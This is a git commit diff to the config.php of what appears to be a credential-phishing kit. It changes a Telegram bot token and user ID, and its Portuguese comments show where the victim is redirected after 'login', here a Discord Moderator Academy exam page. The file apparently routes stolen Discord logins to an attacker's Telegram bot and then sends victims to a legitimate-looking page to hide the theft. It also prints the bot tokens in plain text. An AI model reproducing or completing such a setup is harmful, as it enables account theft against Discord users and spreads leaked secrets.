dd7eab1d12ca8c5768a95796e3ce69d4c489df3b
samuel594 <69123551+samuel594@users.noreply.github.com>
2022-02-21 14:47:38 -0300

    Update config.php

--- core/system/config.php
+++ core/system/config.php
@@ -1,7 +1,7 @@
 <?php
 
-    $bot_token = 'ckUKsTBf1ECrIVRWigGnMMTlDihs2Da0lrqfInehKjp2Io3gsBlMbGOtgjd2Zd_sbQBt'; # Telegram Bot Token
-    $user_id = '933972107677814794'; # Telegram User ID (apenas os numeros ou caso queira colocar mais de um use 'id1', 'id2', 'id3'
+    $bot_token = 'AAHxlxhgl2HYBi0Jsf9umxfAGLk4haR-mkQ'; # Telegram Bot Token
+    $user_id = '5053644619'; # Telegram User ID (apenas os numeros ou caso queira colocar mais de um use 'id1', 'id2', 'id3'
 
     $url_redirect = "https://survey.alchemer.com/s3/6323420/Discord-Moderator-Academy-Exam"; # URL Pra onde vai redirecionar depois do login
 ?>
